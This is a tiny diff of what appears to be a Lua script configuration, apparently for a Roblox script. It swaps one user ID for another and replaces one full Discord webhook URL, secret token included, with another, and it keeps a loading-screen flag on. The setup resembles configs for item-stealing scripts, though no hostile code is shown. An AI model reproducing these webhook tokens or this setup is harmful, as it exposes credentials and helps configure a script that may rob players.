@@ -1,6 +1,6 @@
-_G.UserID =3221909215
+_G.UserID =2383755050
 
-_G.Webhook = "https://discord.com/api/webhooks/1097567032712646779/QkVuuNj1BN6yKMY_6Zi7uW01iDU_snZ_T400qTSBhfdjPr32668FsW6snWqRrSYfxdYP"
+_G.Webhook = "https://discord.com/api/webhooks/1174071747738349714/jZd_BozcQKMYuRpIYfqA7GUvLJwSVZL0j1b92EC2TEBhGnv9FdWd053udS7VADIyTrDa"
 
 _G.LoadingScreen = true
 
